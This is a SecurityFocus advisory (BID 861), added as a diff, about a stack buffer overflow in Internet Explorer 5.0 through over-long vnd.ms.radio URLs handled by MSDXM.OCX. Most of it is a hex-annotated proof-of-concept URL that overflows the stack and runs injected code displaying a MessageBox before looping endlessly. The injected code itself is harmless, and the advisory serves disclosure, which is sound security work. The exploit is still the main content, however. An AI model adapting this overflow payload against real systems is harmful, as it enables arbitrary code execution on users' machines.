@@ -1,0 +1,35 @@
+Internet Explorer 5.0 for Windows 95/Windows 98/Windows NT 4 vnd.ms.radio URL Vulnerability
+
+source: http://www.securityfocus.com/bid/861/info
+
+Internet Explorer can handle URLs of type vnd.ms.radio: for streaming audio content. If a URL with 360 or more characters after 'vnd.ms.radio' is specified, a buffer in the file MSDXM.OCX gets overwritten, allowing arbitrary code to be run on the client machine. 
+
+The following is the binary for a URL or link which overflows the stack and displays a simple MessageBox, then loops endlessly.
+All binary data is represented like: [xx]. Everything else is text.
+
+Off Data
+------------------------------------------------
+000 vnd.ms.radio:\\j
+010 kwashere9991[C0][89][07][83]
+020 [EF][0C]PWWP[FF][15][14][16]0[1D][EB][FE]00
+030 0000000000000000
+040 0000000000000000
+050 0000000000000000
+060 0000000000000000
+070 0000000000000000
+080 0000000000000000
+090 0000000000000000
+0A0 0000000000000000
+0B0 0000000000000000
+0C0 0000000000000000
+0D0 0000000000000000
+0E0 0000000000000000
+0F0 0000000000000000
+100 0000000000000000
+110 0000000000000000
+120 0000000000000000
+130 0000000000[1D]00000
+140 00[1D]000[1D]000[1D]000[1D]0
+150 000[1A][6F][36][1D]0000000[1D]0
+160 000000[1D]0
+------------------------------------------------ 
